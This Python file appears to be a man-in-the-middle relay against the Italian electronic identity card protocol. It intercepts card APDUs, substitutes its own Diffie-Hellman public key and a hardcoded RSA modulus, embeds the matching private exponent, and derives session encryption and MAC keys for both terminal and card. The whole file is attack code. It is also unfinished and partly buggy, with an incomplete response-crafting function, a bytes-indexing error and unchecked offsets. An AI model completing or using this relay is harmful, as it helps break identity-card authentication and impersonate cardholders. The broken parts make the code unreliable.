from enum import Enum
import random
import hashlib
from Crypto.Cipher import DES3, DES

class CDES3:
    def __init__(self, key:list, iv:list):
        self.keySize = len(key)
        self.keyVal = bytes(key)
        self.iv = bytes(iv)
        self.cipher = DES3.new(self.keyVal,DES3.MODE_CBC, iv=self.iv)

            
    def encrypt(self, data:list):
        resp = list(self.cipher.encrypt(bytes(data)))

        return resp
    
    def decrypt(self, data:list):
        resp = list(self.cipher.decrypt(bytes(data)))
        
        return resp

class CMAC:
    def __init__(self, key:list, iv:list):
        self.iv = bytes(iv)
        self.keySize = len(key)
        match self.keySize:
            case 16:
                self.keyVal1 = bytes(key[:8])
                self.keyVal2 = bytes(key[8:])
                self.keyVal3 = self.keyVal1
            case 24:
                self.keyVal1 = bytes(key[:8])
                self.keyVal2 = bytes(key[8:16])
                self.keyVal3 = bytes(key[16:])
            case _:
                raise Exception("Key size must be 16 or 24 bytes long")
        
        self.cipherDES = DES.new(self.keyVal1, DES.MODE_CBC, iv=self.iv)
        self.cipherDES3 = DES3.new(self.keyVal1+self.keyVal2, DES3.MODE_CBC, iv=self.iv)
    
    def mac(self, data:list):
        if len(data) > 8:
            tmp_iv = self.cipherDES.encrypt(bytes[data[:-8]])[-8:]
            self.cipherDES3 = DES3.new(self.keyVal1+self.keyVal2, DES3.MODE_CBC, iv=tmp_iv)
        
        resp = list(self.cipherDES3.encrypt(bytes(data[-8:])))
        self.cipherDES3 = DES3.new(self.keyVal1+self.keyVal2, DES3.MODE_CBC, iv=self.iv)
        
        return resp

        
        


class Stage(Enum):
    START = 1
    INIT_DH_PARAM = 2
    READ_DAPP_PUBKEY = 3
    DH_KEY_EXCHANGE = 4
    DAPP = 5
    VERIFYPIN = 6
    READSERIALECIE = 7
    READCERTCIE = 8
    END = 9

DEFMODULE = [ 0xba, 0x28, 0x37, 0xab, 0x4c, 0x6b, 0xb8, 0x27, 0x57, 0x7b, 0xff, 0x4e, 0xb7, 0xb1, 0xe4, 0x9c, 0xdd, 0xe0, 0xf1, 0x66, 0x14, 0xd1, 0xef, 0x24, 0xc1, 0xb7, 0x5c, 0xf7, 0x0f, 0xb1, 0x2c, 0xd1, 0x8f, 0x4d, 0x14, 0xe2, 0x81, 0x4b, 0xa4, 0x87, 0x7e, 0xa8, 0x00, 0xe1, 0x75, 0x90, 0x60, 0x76, 0xb5, 0x62, 0xba, 0x53, 0x59, 0x73, 0xc5, 0xd8, 0xb3, 0x78, 0x05, 0x1d, 0x8a, 0xfc, 0x74, 0x07, 0xa1, 0xd9, 0x19, 0x52, 0x9e, 0x03, 0xc1, 0x06, 0xcd, 0xa1, 0x8d, 0x69, 0x9a, 0xfb, 0x0d, 0x8a, 0xb4, 0xfd, 0xdd, 0x9d, 0xc7, 0x19, 0x15, 0x9a, 0x50, 0xde, 0x94, 0x68, 0xf0, 0x2a, 0xb1, 0x03, 0xe2, 0x82, 0xa5, 0x0e, 0x71, 0x6e, 0xc2, 0x3c, 0xda, 0x5b, 0xfc, 0x4a, 0x23, 0x2b, 0x09, 0xa4, 0xb2, 0xc7, 0x07, 0x45, 0x93, 0x95, 0x49, 0x09, 0x9b, 0x44, 0x83, 0xcb, 0xae, 0x62, 0xd0, 0x09, 0x96, 0x74, 0xdb, 0xf6, 0xf3, 0x9b, 0x72, 0x23, 0xa9, 0x9d, 0x88, 0xe3, 0x3f, 0x1a, 0x0c, 0xde, 0xde, 0xeb, 0xbd, 0xc3, 0x55, 0x17, 0xab, 0xe9, 0x88, 0x0a, 0xab, 0x24, 0x0e, 0x1e, 0xa1, 0x66, 0x28, 0x3a, 0x27, 0x4a, 0x9a, 0xd9, 0x3b, 0x4b, 0x1d, 0x19, 0xf3, 0x67, 0x9f, 0x3e, 0x8b, 0x5f, 0xf6, 0xa1, 0xe0, 0xed, 0x73, 0x6e, 0x84, 0xd5, 0xab, 0xe0, 0x3c, 0x59, 0xe7, 0x34, 0x6b, 0x42, 0x18, 0x75, 0x5d, 0x75, 0x36, 0x6c, 0xbf, 0x41, 0x36, 0xf0, 0xa2, 0x6c, 0x3d, 0xc7, 0x0a, 0x69, 0xab, 0xaa, 0xf6, 0x6e, 0x13, 0xa1, 0xb2, 0xfa, 0xad, 0x05, 0x2c, 0xa6, 0xec, 0x9c, 0x51, 0xe2, 0xae, 0xd1, 0x4d, 0x16, 0xe0, 0x90, 0x25, 0x4d, 0xc3, 0xf6, 0x4e, 0xa2, 0xbd, 0x8a, 0x83, 0x6b, 0xba, 0x99, 0xde, 0xfa, 0xcb, 0xa3, 0xa6, 0x13, 0xae, 0xed, 0xd9, 0x3a, 0x96, 0x15, 0x27, 0x3d ]
DEFPRIVEXP = [ 0x47, 0x16, 0xc2, 0xa3, 0x8c, 0xcc, 0x7a, 0x07, 0xb4, 0x15, 0xeb, 0x1a, 0x61, 0x75, 0xf2, 0xaa, 0xa0, 0xe4, 0x9c, 0xea, 0xf1, 0xba, 0x75, 0xcb, 0xa0, 0x9a, 0x68, 0x4b, 0x04, 0xd8, 0x11, 0x18, 0x79, 0xd3, 0xe2, 0xcc, 0xd8, 0xb9, 0x4d, 0x3c, 0x5c, 0xf6, 0xc5, 0x57, 0x53, 0xf0, 0xed, 0x95, 0x87, 0x91, 0x0b, 0x3c, 0x77, 0x25, 0x8a, 0x01, 0x46, 0x0f, 0xe8, 0x4c, 0x2e, 0xde, 0x57, 0x64, 0xee, 0xbe, 0x9c, 0x37, 0xfb, 0x95, 0xcd, 0x69, 0xce, 0xaf, 0x09, 0xf4, 0xb1, 0x35, 0x7c, 0x27, 0x63, 0x14, 0xab, 0x43, 0xec, 0x5b, 0x3c, 0xef, 0xb0, 0x40, 0x3f, 0x86, 0x8f, 0x68, 0x8e, 0x2e, 0xc0, 0x9a, 0x49, 0x73, 0xe9, 0x87, 0x75, 0x6f, 0x8d, 0xa7, 0xa1, 0x01, 0xa2, 0xca, 0x75, 0xa5, 0x4a, 0x8c, 0x4c, 0xcf, 0x9a, 0x1b, 0x61, 0x47, 0xe4, 0xde, 0x56, 0x42, 0x3a, 0xf7, 0x0b, 0x20, 0x67, 0x17, 0x9c, 0x5e, 0xeb, 0x64, 0x68, 0x67, 0x86, 0x34, 0x78, 0xd7, 0x52, 0xc7, 0xf4, 0x12, 0xdb, 0x27, 0x75, 0x41, 0x57, 0x5a, 0xa0, 0x61, 0x9d, 0x30, 0xbc, 0xcc, 0x8d, 0x87, 0xe6, 0x17, 0x0b, 0x33, 0x43, 0x9a, 0x2c, 0x93, 0xf2, 0xd9, 0x7e, 0x18, 0xc0, 0xa8, 0x23, 0x43, 0xa6, 0x01, 0x2a, 0x5b, 0xb1, 0x82, 0x28, 0x08, 0xf0, 0x1b, 0x5c, 0xfd, 0x85, 0x67, 0x3a, 0xc0, 0x96, 0x4c, 0x5f, 0x3c, 0xfd, 0x2d, 0xaf, 0x81, 0x42, 0x35, 0x97, 0x64, 0xa9, 0xad, 0xb9, 0xe3, 0xf7, 0x6d, 0xb6, 0x13, 0x46, 0x1c, 0x1b, 0xc9, 0x13, 0xdc, 0x9a, 0xc0, 0xab, 0x50, 0xd3, 0x65, 0xf7, 0x7c, 0xb9, 0x31, 0x94, 0xc9, 0x8a, 0xa9, 0x66, 0xd8, 0x9c, 0xdd, 0x55, 0x51, 0x25, 0xa5, 0xe5, 0x9e, 0xcf, 0x4f, 0xa3, 0xf0, 0xc3, 0xfd, 0x61, 0x0c, 0xd3, 0xd0, 0x56, 0x43, 0x93, 0x38, 0xfd, 0x81 ]
DEFPUBEXP = [ 0x00, 0x01, 0x00, 0x01 ]


APDU_GETDHDUOPDATA_G = [ 0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x97, 0x00 ]
APDU_GETDHDUOPDATA_GETDATA = [ 0x00, 0xc0, 0x00, 0x00, 0x12 ]
APDU_GETDHDUOPDATA_P = [  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x98, 0x00 ]
APDU_GETDHDUOPDATA_Q = [  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x99, 0x00 ]

#READ_DAPP_PUBKEY
READ_READDAPPPUBKEY = [0x00, 0xa4, 0x02, 0x04, 0x02, 0x10, 0x04]
ADPU_PUBKEY1 = [0x00, 0xb0, 0x00, 0x00, 0x80]
ADPU_PUBKEY2 = [0x00, 0xb0, 0x00, 0x80, 0x80]
ADPU_PUBKEY3 = [0x00, 0xb0, 0x01, 0x00, 0x80]

#DH_KEY_EXCHANGE
MSE_SET1 = [ 0x10, 0x22, 0x41, 0xa6 ]
MSE_SET2 = [ 0x00, 0x22, 0x41, 0xa6 ]
APDU_GET_DATA_DATA1 = [ 0x00, 0xcb, 0x3f, 0xff, 0x06, 0x4d, 0x04, 0xa6, 0x02, 0x91, 0x00 ]
APDU_GET_DATA_DATA2 = [ 0x00, 0xc0, 0x00, 0x00, 0x08 ]
DIFFENC = [ 0x00, 0x00, 0x00, 0x01 ]
DIFFMAC = [ 0x00, 0x00, 0x00, 0x02 ]

#DAPP
SELECTKEY = [ 0x0c, 0x22, 0x81, 0xb6 ]
VERIFYCERT1 = [ 0x1c, 0x2A, 0x00, 0xAE ]
VERIFYCERT2 = [ 0x0c, 0x2A, 0x00, 0xAE ]
SETCHR = [ 0x0c, 0x22, 0x81, 0xA4 ]
GETCHALLENGE = [ 0x0c, 0x84, 0x00, 0x00 ]
EXTAUTH1 = [ 0x1c, 0x82, 0x00, 0x00 ]
EXTAUTH2 = [ 0x0c, 0x82, 0x00, 0x00 ]
INTAUTH = [ 0x0c, 0x22, 0x41, 0xa4 ]
GIVERANDOM = [ 0x0c, 0x88, 0x00, 0x00 ]



class RelayMiddleman(object):
    #INIT_DH_PARAM
    dh_g = 0
    dh_gBytes = []
    dh_p = 0
    dh_pBytes = []
    #ByteDynArray dh_q;
    dh_qBytes = []

    #DH_KEY_EXCHANGE
    dh_pubKey_mitm = 0
    dh_pubKey_mitmBytes = []
    dh_prKey_mitm = 0
    dh_prKey_mitmBytes = []
    #BYTE *dh_pubKey_mitmBytes;
    dh_IFDpubKeyBytes = []
    dh_IFDpubKey = 0
    dh_ICCpubKeyBytes = []
    dh_ICCpubKey = 0
    #sessENC_IFD, sessMAC_IFD, sessSSC_IFD
    #sessENC_ICC, sessMAC_ICC, sessSSC_ICC

    def __init__(self):
        self.stage = Stage.START

        self.curr_apduSize = 0
        self.curr_apdu = bytes()

    @staticmethod
    def increment(seq:list):
        for i in range(len(seq) - 1, -1, -1):
            if seq[i] < 255:
                seq[i] += 1
                for j in range(i+1, len(seq)):
                    seq[j] = 0
                return
        
    def craft_respSM(self, keyEnc:list, keySig:list, resp:list, seq:list):
        RelayMiddleman.increment(self.sessSSC_ICC)
        RelayMiddleman.increment(self.sessSSC_IFD)
        calcMac = []
        swBa = []
        tagMacBa = []
        iv = [0 for _ in range(8)]

        encDes = CDES3(keyEnc, iv)
        sigMac = CMAC(keySig, iv)

    def handleInPDU(self, inPDU: bytes):
        """
        This method is called on each PDU that is fed into the realy (vdpu -> vicc).
        It may be overwritten to modify the packages send from the terminal to the 
        real smart card.
        """
        self.prev_apduSize = self.curr_apduSize
        self.prev_apdu = self.curr_apdu
        self.curr_apdu = inPDU
        self.curr_apduSize = len(self.curr_apdu)

        match self.stage:
            case Stage.START:
                #self.curr_apdu is a list of int
                if self.curr_apdu == APDU_GETDHDUOPDATA_G:
                    self.stage = Stage.INIT_DH_PARAM
            case Stage.DH_KEY_EXCHANGE:
                self.dh_key_exchange_in()
            
        

      
        #print("apdu:")
        #print(bytes(inPDU).hex(), "\n")
        return self.curr_apdu

    def handleOutPDU(self, outPDU: bytes):
        """
        This method is called on each PDU that is produced by the relay (vicc -> vdpu).
        It may be overwritten to modify the packages send from the real smart card to the
        terminal.
        """
        self.resp = outPDU
        self.respSize = len(outPDU)

        match self.stage:
            case Stage.INIT_DH_PARAM:
                self.init_dh_param_out()
            case Stage.READ_DAPP_PUBKEY:
                self.read_dapp_pubkey_out()
            case Stage.DH_KEY_EXCHANGE:
                self.dh_key_exchange_out()

        #print("resp:")
        #print(bytes(outPDU).hex(), "\n")
        return self.resp  
    



    def dh_key_exchange_in(self):
        if self.curr_apdu[0:4] == MSE_SET1:
            self.dh_prKey_mitm_bytes = [random.randint(0,255) for i in range(len(self.dh_qBytes))]
            while self.dh_qBytes[0] < self.dh_prKey_mitm_bytes[0]:
                self.dh_prKey_mitm_bytes = [random.randint(0,255) for i in range(len(self.dh_qBytes))]

            self.dh_prKey_mitm_bytes[-1] |= 1

            self.dh_g = int.from_bytes(bytes(self.dh_gBytes), 'big')
            self.dh_p = int.from_bytes(bytes(self.dh_pBytes), 'big')
            self.dh_prKey_mitm = int.from_bytes(bytes(self.dh_prKey_mitm_bytes), 'big')
            self.dh_pubKey_mitm = pow(self.dh_g, self.dh_prKey_mitm, self.dh_p)
            self.dh_pubKey_mitmBytes = list(int.to_bytes(self.dh_pubKey_mitm, 256, 'big'))

            #TODO check array offsets
            self.dh_IFDpubKeyBytes[:self.curr_apduSize-15] = self.curr_apdu[15:]
            self.curr_apdu[15:] = self.dh_pubKey_mitmBytes[:self.curr_apduSize-15]

        if self.curr_apdu[0:4] == MSE_SET2:
            #TODO check array offsets
            self.dh_IFDpubKeyBytes[245:] = self.curr_apdu[5:]
            self.curr_apdu[5:] = self.dh_pubKey_mitmBytes[245:]
            

    def init_dh_param_out(self):
        if self.curr_apdu[:17] == APDU_GETDHDUOPDATA_G:
            self.dh_gBytes = self.resp[18:self.respSize-20]

        if self.curr_apdu[:17] == APDU_GETDHDUOPDATA_P:
            self.dh_pBytes = self.resp[18:self.respSize-20]

        if self.curr_apdu[:17] == APDU_GETDHDUOPDATA_Q:
            #TODO implement a proper CASN parser (ANS1)
            tmp = []
            tmp = self.resp[:42]
            self.dh_qBytes = tmp[-32:]
            self.stage = Stage.READ_DAPP_PUBKEY

        if self.curr_apdu[:5] == APDU_GETDHDUOPDATA_GETDATA:
            if self.prev_apdu[:17] == APDU_GETDHDUOPDATA_G:
                self.dh_gBytes += self.resp[:18]
            if self.prev_apdu[:17] == APDU_GETDHDUOPDATA_P:
                self.dh_pBytes += self.resp[:18]
    
    def read_dapp_pubkey_out(self):
        #TODO chek if array offsets are correct
        if self.curr_apdu[:5] == ADPU_PUBKEY1:
            self.resp[9:self.respSize-11+9] = DEFMODULE[:self.respSize-11]

        if self.curr_apdu[:5] == ADPU_PUBKEY2:
            self.resp[:self.respSize-2] = DEFMODULE[119:self.respSize-2+119]

        if self.curr_apdu[:5] == ADPU_PUBKEY3:
            self.resp[:9] = DEFMODULE[247:256]
            self.stage = Stage.DH_KEY_EXCHANGE

    def dh_key_exchange_out(self):
        if self.curr_apdu[:11] == APDU_GET_DATA_DATA1:
            self.dh_ICCpubKeyBytes[:248] = self.resp[8:248]
            self.resp[8:248] = self.dh_pubKey_mitmBytes[:248]

        if self.curr_apdu[:11] == APDU_GET_DATA_DATA2:
            self.dh_ICCpubKeyBytes[248:256] = self.resp[:8]
            self.resp[:8] = self.dh_pubKey_mitmBytes[248:256]

            self.dh_IFDpubKey = int.from_bytes(bytes(self.dh_IFDpubKeyBytes), 'big')
            self.dh_ICCpubKey = int.from_bytes(bytes(self.dh_ICCpubKeyBytes), 'big')
        
            secretIFD = pow(self.dh_IFDpubKey, self.dh_prKey_mitm, self.dh_p)
            secretIFDBytes = list(int.to_bytes(secretIFD, 256, 'big'))
            self.sessENC_IFD = list(hashlib.sha256(bytes(secretIFDBytes + DIFFENC)).digest()[:16])
            self.sessMAC_IFD = list(hashlib.sha256(bytes(secretIFDBytes + DIFFMAC)).digest()[:16])


            secretICC = pow(self.dh_ICCpubKey, self.dh_prKey_mitm, self.dh_p)
            secretICCBytes = list(int.to_bytes(secretICC, 256, 'big'))
            self.sessENC_ICC = list(hashlib.sha256(bytes(secretICCBytes + DIFFENC)).digest()[:16])
            self.sessMAC_ICC = list(hashlib.sha256(bytes(secretICCBytes + DIFFMAC)).digest()[:16])

            self.sessSSC_IFD = [0 for _ in range(8)]
            self.sessSSC_IFD[7] = 1

            self.sessSSC_ICC = [0 for _ in range(8)]
            self.sessSSC_ICC[7] = 1

            self.stage = Stage.DAPP